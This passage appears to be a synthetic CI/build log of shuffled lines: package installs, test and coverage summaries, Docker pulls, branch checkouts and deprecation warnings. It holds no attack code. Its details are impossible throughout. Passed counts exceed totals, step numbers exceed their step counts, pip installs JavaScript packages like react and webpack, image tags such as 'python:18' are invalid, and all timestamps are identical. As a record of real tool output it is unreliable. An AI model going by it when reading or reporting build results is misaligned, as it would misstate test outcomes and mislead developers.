(252ms)\n[12:46:43] WARN: Deprecated API usage\nCache saved successfully\nDone.\nEnvironment: development\nnpm install: added 67 packages\nBundling vendor.css\nSwitched to branch 'feature/task-656'\nBundling main.css\nDone.\nCache miss for key-4788\nArtifact uploaded: build.tar.gz (42MB)\nCache saved successfully\nFinished.\nUsing Python 3.10\nStep 3/16: Deploying\n\u2717 build failed with exit code 7\nCache restored successfully (388MB)\nPulling image: python:18\nSnapshots: 28 passed, 27 total\nCreating production build...\nWARNING: jest has known vulnerabilities\nVerifying...\nCreating production build...\nFAILED: test_db_connect\nStep 11/22: Linting\n[12:46:43] DEBUG: Memory usage: 1544MB\n\u2713 All checks passed\n[12:46:43] DEBUG: Initializing service\nSnapshots: 48 passed, 39 total\n[12:46:43] INFO: Processing request\nProcessing...\n[12:46:43] DEBUG: Query executed in 70ms\nFAILED: test_api_health\nBundling runtime.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nLoading...\nnpm install: resolved 1173 packages\nFetching from https://registry.npmjs.org/package.json\n[12:46:43] DEBUG: Memory usage: 188MB\nSwitched to branch 'hotfix/task-358'\n\u2713 All checks passed\nSnapshots: 36 passed, 3 total\nStep 16/17: Deploying\nWARNING: lodash has known vulnerabilities\nCompiling src/app.ts...\nCompiling src/service.java...\nOK\nArtifact uploaded: build.tar.gz (24MB)\nCoverage: 83% statements, 71% branches\nLayer 6/10: ENV command\nGET /api - 200 (66ms)\nNODE_ENV=development\nArtifact uploaded: dist.zip (83MB)\n[12:46:43] INFO: Request completed\n[12:46:43] INFO: Request completed\nTransforming 485 files...\nTests: 226 passed, 149 total\nImage pulled successfully\nBundling runtime.js\nFetching submodules...\nnpm notice: created a lockfile\nCompiling utils/service.java...\n[12:46:43] DEBUG: Loading configuration\nTests: 97 passed, 352 total\npip: Collecting react\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:43] INFO: Connecting to database\npip install: Successfully installed react-2.12\nArtifact uploaded: dist.zip (27MB)\nEnvironment: staging\n[12:46:43] DEBUG: Initializing service\nSwitched to branch 'hotfix/task-353'\npip: Downloading prettier-1.3.tar.gz\nCompleted.\nLoading...\nCache hit for key-7590\n  PASS: unit/test_cache_hit.spec.js\nWARNING: react has known vulnerabilities\nStep 14/20: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:43] INFO: Request completed\n\u2713 All checks passed\n[12:46:43] DEBUG: Query executed in 97ms\nStep 1/19: Building\nSwitched to branch 'bugfix/task-914'\n[12:46:43] INFO: Connecting to database\nnpm notice: created a lockfile\nStep 12/24: Running migrations\nFetching from https://amazonaws.com/package.json\nTime: 46.109s\nPOST /upload - 200 (403ms)\nSwitched to branch 'bugfix/task-285'\nWARNING: express has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nException: NullPointerException\n[12:46:43] INFO: Request completed\nStep 18/22: Installing dependencies\n\u2713 All checks passed\nUsing Python 3.11\nStep 1/17: Installing dependencies\nArtifact uploaded: build.tar.gz (5MB)\nReady.\nCache restored successfully (259MB)\npip install: Successfully installed express-3.2\npip: Collecting prettier\n\u2717 build failed with exit code 28\nTransforming 266 files...\nHEAD is now at fd5b5b2\nVerifying...\npip: Downloading webpack-4.1.tar.gz\nSwitched to branch 'bugfix/task-330'\nStep 11/20: Building\nStep 7/22: Building\nCache invalidated: dependencies\n[12:46:43] DEBUG: Loading configuration\nCache miss for key-8064\nSnapshots: 11 passed, 48 total\nMinifying app.js\nHEAD is now at 5c4da20\npip: Collecting eslint\n[12:46:43] INFO: Processing request\nStep 3/21: Running migrations\nBuilding Docker image...\nWARNING: axios has known vulnerabilities\nHEAD is now at 6628fed\nPushing to registry...\nAlready up to date.\nWaiting...\nTLS handshake completed\nWARNING: prettier has known vulnerabilities\nCreating production build...\nPlatform: darwin-arm64\nVerifying...\nOK\nStep 8/24: Installing dependencies\n[12:46:43] INFO: Starting build process\nWaiting...\npip: Collecting webpack\nPlatform: darwin-arm64\nCache saved successfully\nTime: 71.746s\nChecking out master branch\nTime: 47.233s\nBundling main.css\nNODE_ENV=production\nArtifact downloaded: 47MB\nUsing Python 3.11\n[12:46:43] INFO: Cache refreshed\nCache saved successfully\nUsing Node.js 14.19.6\npip: Installing build dependencies...\nUsing Python 3.9\nOK\nCompiling utils/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nVerifying...\nArtifact uploaded: dist.zip (70MB)\nCreating production build...\n\u2717 build failed with exit code 93\n\u2717 build failed with exit code 50\n\u2713 Step 'build' succeeded\nVerifying...\nEnvironment: test\npip: Downloading lodash-5.1.tar.gz\nCompiling utils/app.ts...\nNODE_ENV=development\nCompiling utils/index.js...\nLoading...\nPulling image: node:latest\nMinifying main.js\n[12:46:43] DEBUG: Query executed in 65ms\nCache hit for key-6846\nStep 6/18: Linting\nCompiling src/handler.rs...\nBuilding Docker image...\n[12:46:43] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: dist.zip (61MB)\n[12:46:43] DEBUG: Initializing service\nEnvironment: staging\n\u2717 build failed with exit code 6\nUploading artifact 'dist' (15 files)\nUploading artifact 'build' (20 files)\nCache restored successfully (249MB)\nGET /health - 200 (64ms)\n[12:46:43] INFO: Request completed\nNODE_ENV=test\n  PASS: unit/test_user_create.spec.js\nBundling vendor.js\n\u2717 build failed with exit code 11\nWaiting...\nStep 8/15: Building\nWARNING: express has known vulnerabilities\nGenerating source maps...\nUploading artifact 'coverage' (34 files)\nPushing to registry...\nWARNING: webpack has known vulnerabilities\nPushing to registry...\nTest Suites: 22 passed, 47 total\nCreating production build...\nCache restored successfully (427MB)\nPulling image: python:3.11\nCompiling components/handler.rs...\nArtifact uploaded: dist.zip (28MB)\n[12:46:43] DEBUG: Loading configuration\n[12:46:43] INFO: Cache refreshed\nCompiling src/main.py...\nCompiling lib/index.js...\n[12:46:43] WARN: Deprecated API usage\npip: Downloading eslint-5.19.tar.gz\nnpm install: resolved 361 packages\nFinished.\nCompiling src/main.py...\nCompiling src/utils.go...\nWARNING: webpack has known vulnerabilities\nCache restored successfully (282MB)\nConnection established\nReady.\n[12:46:43] WARN: Deprecated API usage\nCompiling src/main.py...\n[12:46:43] INFO: Processing request\nGET /status - 204 (47ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_cache_hit (4ms)\nMinifying vendor.js\nConnection established\n\u2713 build completed\nArtifact uploaded: build.tar.gz (23MB)\nMinifying vendor.js\nWARNING: lodash has known vulnerabilities\nSnapshots: 46 passed, 46 total\nCompiling lib/handler.rs...\nStep 13/23: Testing\n=== Step setup_environment completed ===\n=== Step: checkout ===\n\u2713 build completed\nCreating production build...\nStep 15/20: Testing\n[12:46:43] INFO: Connecting to database\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm install: resolved 1284 packages\nnpm notice: created a lockfile\nCache hit for key-3856\nTime: 8.908s\n  PASS: unit/test_auth_login.spec.js\npip: Installing build dependencies...\nCache restored successfully (59MB)\nStep 2/22: Testing\nLoading...\n[12:46:43] DEBUG: Query executed in 99ms\nLoading...\nDone.\nyarn add: Done in 22.87s\nSwitched to branch 'hotfix/task-919'\nMinifying main.js\nReady.\nLoading...\nChecking out master branch\nBundling runtime.css\nTLS handshake completed\nPOST /api - 201 (483ms)\nArtifact downloaded: 20MB\n[12:46:43] INFO: Processing request\npip: Installing build dependencies...\nFinished.\nCache saved successfully\nyarn add: Done in 18.64s\npip: Collecting webpack\n\u2713 All checks passed\nArtifact uploaded: dist.zip (2MB)\nStep 18/22: Testing\nGET /status - 201 (25ms)\nArtifact uploaded: dist.zip (91MB)\n[12:46:43] DEBUG: Connection pool: 2 active\n[12:46:43] WARN: Deprecated API usage\n\u2717 build failed with exit code 107\nSuccess!\nPulling image: alpine:3.11\nGET /status - 201 (15ms)\nTime: 100.396s\nTime: 76.16s\nWaiting...\nnpm notice: created a lockfile\n\u2717 build failed with exit code 63\nyarn add: Done in 11.87s\nCreating production build...\nTLS handshake completed\nLoading...\n[12:46:43] WARN: Deprecated API usage\nPOST /api - 202 (168ms)\n[12:46:43] INFO: Processing request\nPulling image: python:3.11\nSuccess!\nnpm install: resolved 494 packages\n\u2713 Task completed in 4453ms\nOK\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 All checks passed\nWaiting...\nStep 16/15: Building\nyarn add: Done in 15.48s\nSwitched to branch 'hotfix/task-574'\n\u2713 Task completed in 3775ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOptimizing 85 modules...\n\u2713 Task completed in 3868ms\nPlatform: linux-x64\n[12:46:43] WARN: Deprecated API usage\n[12:46:43] DEBUG: Query executed in 10ms\nCache miss for key-2188\nStep 3/23: Linting\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling utils/main.py...\npip: Downloading webpack-4.4.tar.gz\n[12:46:43] INFO: Processing request\nInstalling lodash@5.1.6\nGenerating source maps...\npip install: Successfully installed express-2.8\nCache miss for key-1212\n\u2717 build failed with exit code 10\nFAILED: test_auth_login\nSuccess!\nCreating production build...\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling lib/handler.rs...\n[12:46:43] WARN: Deprecated API usage\nCompiling utils/app.ts...\nStep 12/21: Installing dependencies\nFetching submodules...\nOptimizing 52 modules...\nPulling image: node:3.11\npip: Downloading jest-1.4.tar.gz\n\u2713 All checks passed\nPOST /api - 201 (237ms)\nCompiling utils/service.java...\nCache miss for key-2129\nStep 14/23: Testing\nBundling runtime.js\nTime: 24.747s\nCompiling src/index.js...\nCompleted.\nVerifying...\nCompiling utils/index.js...\n[12:46:43] INFO: Starting build process\nOptimizing 83 modules...\nArtifact uploaded: build.tar.gz (15MB)\n[12:46:43] DEBUG: Loading configuration\nUsing Node.js 20.5.5\n[12:46:43] INFO: Request completed\nyarn add: Done in 24.15s\nStep 10/17: Linting\nyarn add: Done in 23.12s\nWARNING: react has known vulnerabilities\nFetching from https://googleapis.com/package.json\nArtifact downloaded: 6MB\nConnection established\nNODE_ENV=test\n[12:46:43] INFO: Starting build process\nLoading...\nLoading...\nSwitched to branch 'feature/task-363'\nGET /health - 204 (77ms)\nDone.\nReady.\nStep 5/24: Building\nUsing Node.js 20.16.10\nUploading artifact 'dist' (17 files)\nStep 8/18: Testing\n\u2713 Step 'build' succeeded\nTLS handshake completed\nGenerating source maps...\nNODE_ENV=development\nEnvironment: development\nArtifact downloaded: 9MB\nFAILED: test_auth_login\nDone.\nLoading...\nCache invalidated: node_modules\nUsing Python 3.10\n  PASS: integration/test_user_create.spec.js\n[12:46:43] INFO: Starting build process\nPlatform: linux-x64\nUsing Node.js 14.8.8\n[12:46:43] DEBUG: Initializing service\nCreating production build...\n[12:46:43] WARN: Deprecated API usage\nBundling styles.css\n[12:46:43] DEBUG: Query executed in 70ms\nUsing Python 3.9\nStep 11/15: Deploying\nCoverage: 76% statements, 67% branches\nSwitched to branch 'bugfix/task-102'\n[12:46:43] DEBUG: Query executed in 12ms\nException: RuntimeError\nUsing Node.js 15.3.10\nImage pulled successfully\nBuilding Docker image...\nCompiling utils/main.py...\nWARNING: axios has known vulnerabilities\nArtifact uploaded: dist.zip (39MB)\nWARNING: jest has known vulnerabilities\nOptimizing 91 modules...\nStep 18/21: Linting\nFetching from https://registry.npmjs.org/package.json\nHEAD is now at 01aec44\nWaiting...\n[12:46:43] INFO: Connecting to database\nTest Suites: 27 passed, 13 total\nCoverage: 84% statements, 89% branches\n\u2713 All checks passed\nPlatform: linux-x64\nPulling image: alpine:18\nSuccess!\nWARNING: axios has known vulnerabilities\nStep 10/16: Testing\nTransforming 568 files...\nnpm notice: package.json updated\n\u2717 build failed with exit code 94\npip: Collecting react\n  PASS: e2e/test_user_create.spec.js\nChecking out develop branch\nProcessing...\nFetching submodules...\nWARNING: react has known vulnerabilities\nRan 156 tests in 49s\nStep 18/23: Installing dependencies\nException: NullPointerException\n[12:46:43] DEBUG: Memory usage: 1712MB\nTime: 92.635s\nStep 6/20: Building\nStep 5/17: Deploying\n  PASS: test_auth_login (87ms)\nCache restored successfully (25MB)\n[12:46:43] INFO: Cache refreshed\n\u2713 Task completed in 4800ms\nRan 164 tests in 33s\nSnapshots: 25 passed, 4 total\n[12:46:43] WARN: Deprecated API usage\nVerifying...\nStep 12/21: Running migrations\n[12:46:43] INFO: Processing request\nTime: 91.334s\nPulling image: node:latest\nEnvironment: development\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:43] INFO: Starting build process\nStep 14/25: Linting\nProcessing...\n[12:46:43] INFO: Processing request\nnpm notice: package.json updated\nConnection established\nStep 19/16: Installing dependencies\nProcessing...\nStep 4/17: Testing\nBuilding Docker image...\nException: TypeError\nLayer 1/9: RUN command\nStep 15/17: Building\nArtifact downloaded: 6MB\n[12:46:43] DEBUG: Loading configuration\npip: Downloading express-4.4.tar.gz\nAlready up to date.\n[12:46:43] INFO: Processing request\nInstalling react@5.19.1\nUsing Python 3.11\nInstalling prettier@1.17.10\nWaiting...\n[12:46:43] INFO: Processing request\n\u2713 deploy completed\nInstalling prettier@1.9.8\nWaiting...\nUsing Python 3.9\nNODE_ENV=production\nPulling image: python:18\nCache restored successfully (254MB)\nStep 11/19: Linting\nFAILED: test_auth_login\n[12:46:43] DEBUG: Loading configuration\nFetching from https://gcr.io/package.json\n\u2713 All checks passed\nnpm install: resolved 813 packages\nOK\nTest Suites: 27 passed, 6 total\nStep 15/22: Building\nCache restored successfully (104MB)\nCache restored successfully (280MB)\npip: Collecting axios\n=== Step checkout completed ===\n=== Step: unit_tests ===\nException: NullPointerException\npip: Downloading webpack-1.4.tar.gz\nWARNING: react has known vulnerabilities\nGenerating source maps...\nnpm notice: package.json updated\nAlready up to date.\n\u2713 All checks passed\nTime: 11.782s\nGET /api - 201 (61ms)\nCompiling lib/main.py...\nTest Suites: 17 passed, 29 total\nStep 4/20: Testing\n[12:46:43] DEBUG: Initializing service\nVerifying...\n[12:46:43] DEBUG: Loading configuration\n\u2713 Step 'test' succeeded\nNODE_ENV=development\nOptimizing 44 modules...\n\u2713 Step 'test' succeeded\nPlatform: win32-x64\n[12:46:43] DEBUG: Memory usage: 736MB\nBundling runtime.css\nEnvironment: development\npip: Installing build dependencies...\nyarn add: Done in 17.35s\nProcessing...\nWARNING: express has known vulnerabilities\nCompiling src/utils.go...\npip install: Successfully installed react-1.14\n[12:46:43] INFO: Processing request\nProcessing...\nArtifact uploaded: build.tar.gz (32MB)\nReady.\n[12:46:43] DEBUG: Query executed in 23ms\nEnvironment: production\nTime: 82.320s\nLayer 8/15: RUN command\n[12:46:43] INFO: Processing request\nCoverage: 89% statements, 67% branches\nConnection established\nnpm notice: package.json updated\nStep 6/20: Building\nyarn add: Done in 20.32s\n[12:46:43] INFO: Request completed\nCompleted.\n  PASS: test_cache_hit (222ms)\nConnection established\nnpm notice: package.json updated\n\u2713 Task completed in 1069ms\nCreating production build...\nChecking out master branch\nStep 9/19: Linting\nBundling main.js\nTime: 79.728s\n[12:46:43] INFO: Request completed\n[12:46:43] DEBUG: Initializing service\n[12:46:43] DEBUG: Connection pool: 17 active\nInstalling lodash@4.19.4\nCoverage: 83% statements, 93% branches\n  PASS: test_cache_hit (131ms)\n[12:46:43] DEBUG: Loading configuration\nTime: 51.480s\nArtifact uploaded: dist.zip (15MB)\nFetching from https://amazonaws.com/package.json\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache miss for key-1411\nWARNING: axios has known vulnerabilities\nTime: 13.664s\nSnapshots: 12 passed, 14 total\nArtifact uploaded: dist.zip (73MB)\nCompiling components/utils.go...\nPushing to registry...\n\u2717 build failed with exit code 103\nCoverage: 88% statements, 66% branches\nFetching submodules...\npip install: Successfully installed react-4.2\nnpm notice: package.json updated\npip install: Successfully installed axios-1.2\nArtifact uploaded: dist.zip (16MB)\nConnection established\nDone.\n[12:46:43] DEBUG: Initializing service\nChecking out master branch\n[12:46:43] INFO: Starting build process\nStep 1/25: Deploying\n  PASS: test_auth_login (396ms)\nBundling vendor.css\n[12:46:43] DEBUG: Initializing service\nWARNING: webpack has known vulnerabilities\npip install: Successfully installed jest-5.14\nArtifact uploaded: dist.zip (24MB)\nWARNING: react has known vulnerabilities\nEnvironment: production\nTransforming 281 files...\nUsing Python 3.10\nOptimizing 28 modules...\n\u2713 deploy completed\n[12:46:43] DEBUG: Memory usage: 1331MB\nBundling main.css\nLayer 2/15: RUN command\nFetching from https://registry.npmjs.org/package.json\nnpm notice: package.json updated\nHEAD is now at eeaa115\nWaiting...\nCreating production build...\n[12:46:43] WARN: Deprecated API usage\nUsing Python 3.10\nSwitched to branch 'hotfix/task-223'\npip: Downloading react-3.5.tar.gz\nCache saved successfully\nnpm notice: package.json updated\nCompiling components/utils.go...\n[12:46:43] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (61MB)\nCache miss for key-3379\nTests: 460 passed, 421 total\nTests: 457 passed, 149 total\nCreating production build...\nTLS handshake completed\nCreating production build...\n  PASS: unit/test_api_health.spec.js\n[12:46:43] DEBUG: Initializing service\nNODE_ENV=development\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCreating production build...\nBuilding Docker image...\nArtifact downloaded: 7MB\n[12:46:43] ERROR: Connection failed\n[12:46:43] DEBUG: Loading configuration\nHEAD is now at 112b4db\npip install: Successfully installed prettier-2.15\nCompiling src/utils.go...\n\u2713 Task completed in 394ms\n[12:46:43] INFO: Starting build process\nNODE_ENV=test\n[12:46:43] INFO: Cache refreshed\nUsing Node.js 18.10.1\nnpm install: added 233 packages\nUsing Node.js 15.10.6\n[12:46:43] INFO: Cache refreshed\nCreating production build...\nCompleted.\npip: Collecting prettier\nCompiling components/utils.go...\nBundling main.css\nFetching from https://githubusercontent.com/package.json\nCache invalidated: node_modules\nCompiling utils/main.py...\nCompiling lib/main.py...\n\u2713 Task completed in 4363ms\npip: Installing build dependencies...\nEnvironment: production\nArtifact uploaded: dist.zip (17MB)\nnpm install: resolved 479 packages\nFinished.\nPOST /upload - 200 (231ms)\nLayer 3/10: ENV command\nUsing Python 3.10\nInstalling webpack@3.1.9\n[12:46:43] INFO: Cache refreshed\n  PASS: test_api_health (282ms)\npip: Downloading jest-1.4.tar.gz\n\u2713 Step 'setup' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling axios@4.19.7\nnpm install: resolved 1002 packages\nEnvironment: production\nAlready up to date.\npip: Downloading prettier-4.8.tar.gz\nCoverage: 95% statements, 80% branches\nWARNING: webpack has known vulnerabilities\nArtifact downloaded: 2MB\nStep 7/16: Installing dependencies\nHEAD is now at f1aa66a\nReady.\n\u2713 All checks passed\n[12:46:43] DEBUG: Memory usage: 542MB\nOK\nTests: 68 passed, 395 total\nUsing Python 3.11\nSnapshots: 13 passed, 22 total\nnpm notice: created a lockfile\nLayer 1/8: COPY command\nCompiling lib/index.js...\n  PASS: e2e/test_db_connect.spec.js\nSuccess!\n[12:46:43] DEBUG: Initializing service\nCache invalidated: build\nLayer 6/15: COPY command\nTime: 105.478s\nGenerating source maps...\nLoading...\nCache invalidated: node_modules\n[12:46:43] ERROR: Connection failed\nTime: 6.730s\nUsing Node.js 17.10.6\nFetching from https://docker.io/package.json\nLayer 2/13: COPY command\nDone.\nException: TypeError\nProcessing...\nTests: 316 passed, 238 total\n\u2713 deploy completed\nFinished.\nWARNING: jest has known vulnerabilities\nUploading artifact 'coverage' (41 files)\nStep 11/17: Installing dependencies\nCompleted.\n[12:46:43] DEBUG: Connection pool: 6 active\nEnvironment: development\nWARNING: lodash has known vulnerabilities\nTLS handshake completed\nChecking out master branch\n[12:46:43] INFO: Request completed\nCache miss for key-6323\nStep 10/16: Building\nOptimizing 24 modules...\nStep 10/17: Linting\n[12:46:43] DEBUG: Initializing service\nCreating production build...\nCompiling utils/handler.rs...\nnpm notice: package.json updated\nyarn add: Done in 17.45s\n  PASS: e2e/test_db_connect.spec.js\nArtifact downloaded: 26MB\nStep 19/24: Running migrations\n  PASS: e2e/test_api_health.spec.js\npip: Downloading express-4.17.tar.gz\n[12:46:43] ERROR: Connection failed\nProcessing...\nOptimizing 53 modules...\n\u2713 build completed\nTests: 312 passed, 196 total\nWARNING: eslint has known vulnerabilities\nTime: 57.915s\nRan 61 tests in 12s\n[12:46:43] WARN: Deprecated API usage\nWARNING: react has known vulnerabilities\nStep 14/18: Linting\nRan 71 tests in 29s\nArtifact uploaded: dist.zip (1MB)\nyarn add: Done in 2.86s\nStep 1/23: Building\nCompiling src/index.js...\nArtifact uploaded: dist.zip (63MB)\nStep 8/25: Deploying\nCompiling utils/index.js...\n\u2713 Step 'setup' succeeded\nWARNING: lodash has known vulnerabilities\n[12:46:43] INFO: Processing request\nCache hit for key-1489\npip: Downloading webpack-4.17.tar.gz\n[12:46:43] INFO: Processing request\nFinished.\nWaiting...\n=== Step unit_tests completed ===\n=== Step: install_dependencies ===\nCoverage: 93% statements, 69% branches\nCreating production build...\nTests: 128 passed, 64 total\n[12:46:43] INFO: Processing request\nStep 2/25: Installing dependencies\nEnvironment: staging\nStep 5/19: Installing dependencies\nWARNING: webpack has known vulnerabilities\n[12:46:43] WARN: Deprecated API usage\n[12:46:43] INFO: Connecting to database\npip: Downloading express-5.2.tar.gz\nPOST /upload - 200 (268ms)\nMinifying app.js\nHEAD is now at 6ff8803\nNODE_ENV=production\npip: Collecting express\n\u2713 All checks passed\nStep 3/25: Running migrations\n[12:46:43] INFO: Processing request\nPOST /api - 201 (22ms)\n[12:46:43] INFO: Processing request\n[12:46:43] DEBUG: Query executed in 27ms\nPushing to registry...\nnpm install: added 302 packages\nTests: 73 passed, 432 total\nUsing Node.js 19.15.2\nUsing Python 3.10\nnpm install: resolved 929 packages\nTLS handshake completed\nReady.\n  PASS: e2e/test_user_create.spec.js\npip: Installing build dependencies...\n[12:46:43] INFO: Cache refreshed\nnpm notice: package.json updated\nStep 3/19: Testing\nAlready up to date.\nFinished.\n[12:46:43] DEBUG: Loading configuration\nCompleted.\nStep 9/17: Building\nEnvironment: production\nFinished.\n\u2717 build failed with exit code 125\nWaiting...\n\u2713 package completed\nGET /status - 201 (19ms)\nWARNING: express has known vulnerabilities\nStep 7/21: Building\nStep 6/22: Installing dependencies\n[12:46:43] INFO: Starting build process\nReady.\nFetching submodules...\nOptimizing 38 modules...\n[12:46:43] WARN: Deprecated API usage\nFinished.\nCompiling utils/service.java...\n\u2713 All checks passed\nImage pulled successfully\nCreating production build...\nWARNING: eslint has known vulnerabilities\n[12:46:43] DEBUG: Loading configuration\nWARNING: express has known vulnerabilities\nnpm notice: created a lockfile\nImage pulled successfully\nCache hit for key-9299\nPulling image: node:18\nStep 6/23: Running migrations\n[12:46:43] DEBUG: Connection pool: 5 active\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:43] WARN: Deprecated API usage\nnpm install: added 31 packages\n[12:46:43] INFO: Starting build process\n[12:46:43] INFO: Cache refreshed\nnpm install: resolved 140 packages\n[12:46:43] DEBUG: Loading configuration\n  PASS: unit/test_user_create.spec.js\nTime: 72.999s\nWaiting...\n[12:46:43] DEBUG: Query executed in 18ms\nTime: 27.879s\nGenerating source maps...\nFinished.\n[12:46:43] INFO: Connecting to database\nTLS handshake completed\nInstalling eslint@2.2.7\nStep 5/18: Building\nOK\nCompiling lib/main.py...\nCompiling lib/main.py...\nPulling image: node:latest\nHEAD is now at f6bb2da\nTest Suites: 17 passed, 39 total\nStep 10/17: Running migrations\n\u2713 Step 'install' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nUsing Node.js 20.0.5\nCompleted.\nnpm notice: created a lockfile\nStep 6/19: Testing\n[12:46:43] DEBUG: Memory usage: 769MB\nOK\nSnapshots: 48 passed, 14 total\nGenerating source maps...\n[12:46:43] DEBUG: Initializing service\npip: Downloading jest-1.14.tar.gz\npip: Downloading eslint-5.12.tar.gz\n  PASS: test_api_health (276ms)\nProcessing...\nVerifying...\nWARNING: webpack has known vulnerabilities\nException: ValueError\nUsing Python 3.10\nImage pulled successfully\n[12:46:43] DEBUG: Memory usage: 113MB\nOK\nStep 2/15: Building\n[12:46:43] DEBUG: Initializing service\n[12:46:43] INFO: Processing request\nFetching submodules...\nArtifact uploaded: build.tar.gz (25MB)\nReady.\nConnection established\nDone.\nSwitched to branch 'bugfix/task-418'\nPOST /api - 201 (46ms)\n[12:46:43] WARN: Deprecated API usage\nCoverage: 84% statements, 100% branches\nOptimizing 77 modules...\nCache miss for key-3879\nChecking out develop branch\nArtifact uploaded: build.tar.gz (32MB)\n\u2717 build failed with exit code 76\n\u2713 deploy completed\n[12:46:43] WARN: Deprecated API usage\n\u2717 build failed with exit code 24\nReady.\nCache invalidated: node_modules\nCompiling utils/handler.rs...\nCoverage: 72% statements, 74% branches\npip: Installing build dependencies...\n[12:46:43] INFO: Cache refreshed\npip: Collecting webpack\nFetching from https://gcr.io/package.json\nCreating production build...\npip: Downloading lodash-5.2.tar.gz\nPushing to registry...\n[12:46:43] DEBUG: Connection pool: 5 active\nUsing Node.js 18.12.6\n[12:46:43] DEBUG: Initializing service\nFinished.\nInstalling react@2.4.0\nWaiting...\nOptimizing 85 modules...\nStep 2/25: Testing\nSuccess!\nOptimizing 12 modules...\nCompiling lib/service.java...\nException: RuntimeError\nPulling image: alpine:18\n[12:46:43] WARN: Deprecated API usage\nFinished.\nWARNING: react has known vulnerabilities\nCompiling lib/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFetching submodules...\nProcessing...\n\u2713 All checks passed\n[12:46:43] WARN: Deprecated API usage\n[12:46:43] DEBUG: Loading configuration\nCache restored successfully (499MB)\nUsing Python 3.9\n  PASS: unit/test_db_connect.spec.js\nTLS handshake completed\nCompiling utils/app.ts...\nVerifying...\n[12:46:43] WARN: Deprecated API usage\nFinished.\nCompiling lib/index.js...\nUsing Python 3.12\nSnapshots: 40 passed, 48 total\nFAILED: test_cache_hit\nStep 3/19: Linting\n\u2713 Task completed in 1656ms\nTests: 269 passed, 179 total\nFinished.\nWARNING: lodash has known vulnerabilities\npip: Downloading webpack-3.9.tar.gz\nCache miss for key-9099\n  PASS: unit/test_cache_hit.spec.js\nTests: 363 passed, 313 total\nCompiling utils/handler.rs...\nUsing Python 3.9\nVerifying...\nWaiting...\nStep 20/22: Testing\nTransforming 376 files...\nnpm notice: package.json updated\n[12:46:43] WARN: Deprecated API usage\n[12:46:43] INFO: Cache refreshed\nUsing Python 3.10\nCoverage: 74% statements, 84% branches\nWaiting...\npip: Collecting express\n[12:46:43] DEBUG: Connection pool: 4 active\nCache miss for key-1633\nWARNING: axios has known vulnerabilities\nnpm install: resolved 1110 packages\npip install: Successfully installed prettier-2.6\n[12:46:43] WARN: Deprecated API usage\n[12:46:43] DEBUG: Memory usage: 1176MB\nDone.\nPOST /data - 202 (234ms)\nOptimizing 34 modules...\nWARNING: jest has known vulnerabilities\n\u2713 Step 'setup' succeeded\nCompiling components/index.js...\nBuilding Docker image...\nTests: 407 passed, 170 total\nWaiting...\nArtifact downloaded: 50MB\nSnapshots: 46 passed, 41 total\nWARNING: jest has known vulnerabilities\nPulling image: alpine:3.11\npip: Downloading webpack-1.0.tar.gz\n[12:46:43] WARN: Deprecated API usage\nBundling main.css\nUsing Node.js 15.16.5\nLayer 5/10: COPY command\nSnapshots: 39 passed, 15 total\nTime: 50.921s\nFinished.\nRan 191 tests in 59s\nMinifying main.js\n[12:46:43] INFO: Starting build process\nEnvironment: test\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:43] INFO: Request completed\nStep 15/15: Building\n\u2713 package completed\nTests: 141 passed, 480 total\nHEAD is now at c673203\n[12:46:43] INFO: Connecting to database\nCoverage: 90% statements, 66% branches\nnpm install: added 165 packages\n[12:46:43] INFO: Connecting to database\n[12:46:43] INFO: Connecting to database\nStep 15/16: Testing\nCompiling lib/app.ts...\nHEAD is now at 6eaa035\nTransforming 922 files...\nHEAD is now at f7c4204\nArtifact uploaded: build.tar.gz (6MB)\nInstalling axios@5.11.6\n[12:46:43] ERROR: Connection failed\n=== Step install_dependencies completed ===\n=== Step: save_cache ===\nOptimizing 69 modules...\nCache hit for key-6832\n  PASS: test_cache_hit (78ms)\nCoverage: 97% statements, 82% branches\nStep 3/25: Deploying\n[12:46:43] INFO: Cache refreshed\nStep 2/18: Deploying\nRan 104 tests in 21s\nPulling image: node:latest\nTLS handshake completed\nConnection established\n[12:46:43] DEBUG: Loading configuration\nFinished.\nBundling styles.js\nArtifact uploaded: dist.zip (93MB)\nVerifying...\nCreating production build...\nWaiting...\nArtifact uploaded: build.tar.gz (2MB)\npip: Collecting webpack\nDone.\n[12:46:43] DEBUG: Query executed in 47ms\nArtifact downloaded: 28MB\n[12:46:43] DEBUG: Initializing service\nVerifying...\nFetching from https://registry.npmjs.org/package.json\n  PASS: unit/test_cache_hit.spec.js\n[12:46:43] DEBUG: Query executed in 93ms\nyarn add: Done in 28.91s\nnpm notice: created a lockfile\nImage pulled successfully\n\u2717 build failed with exit code 86\n  PASS: unit/test_auth_login.spec.js\nPlatform: linux-x64\nUsing Python 3.11\nCompiling lib/service.java...\n\u2713 Task completed in 4801ms\n[12:46:43] INFO: Request completed\nTests: 475 passed, 295 total\nSnapshots: 19 passed, 50 total\nArtifact uploaded: dist.zip (12MB)\n[12:46:43] INFO: Request completed\nImage pulled successfully\nMinifying app.js\nCompleted.\nCache invalidated: build\nImage pulled successfully\nTest Suites: 30 passed, 33 total\npip: Installing build dependencies...\npip: Downloading react-1.9.tar.gz\nWARNING: webpack has known 